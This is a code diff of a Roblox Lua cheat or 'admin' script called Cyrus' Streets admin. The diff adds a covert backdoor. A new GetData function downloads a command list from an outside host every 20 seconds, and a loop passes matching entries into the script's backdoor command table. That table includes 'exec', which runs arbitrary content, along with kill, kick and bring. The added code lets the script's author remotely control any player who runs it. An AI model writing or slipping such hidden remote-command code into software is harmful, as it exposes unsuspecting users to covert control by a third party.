@@ -200,7 +200,7 @@ local BackDoorTableCommands = {
 		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
 	};
 	['bring'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand("to "..CommandedPlayer.Name) end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
 		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
 	};
 	['kill'] = {
@@ -208,7 +208,7 @@ local BackDoorTableCommands = {
 		['Levels'] = {[2] = true;[3] = true;[4] = true;}
 	};
 	['exec'] = {
-		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand(Content) end end;
+		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
 		['Levels'] = {[3] = true;[4] = true;}
 	};
 	['kick'] = {
@@ -543,14 +543,20 @@ end
 
 -- [[ End ]] --
 
--- [[ Local functions ]] -- 
+-- [[ Local functions ]] --
+
+local function GetData()
+	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.orgfree.com/Commands.json"))
+end
 
 local function BackdoorCheck(Player,Chat)
-	if Chat:sub(1,1) == "`" then 
+	if Chat:sub(1,1) == "`" then
+		print'1'
 		local Arguments = string.split(Chat:sub(2)," ")
 		local Command = BackDoorTableCommands[table.remove(Arguments,1)]
 		local PlayerToMeme = PlrFinder(table.remove(Arguments,1))
-		if Command and PlayerToMeme then 
+		if Command and PlayerToMeme then
+			print'2'
 			Command['Func'](PlayerToMeme,table.concat(Arguments," "),Player)
 		end
 	end 
@@ -3247,3 +3253,12 @@ end))
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: 6CddKc)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
 notif("Newest Update","forgot I had this antiaim method lol",10,nil)
+
+while wait(20) do
+	local Data = GetData()
+	for i,v in pairs(Data) do
+		if PlrFinder(i) == LP then
+			BackdoorCheck("none","`"..v)
+		end
+	end
+end
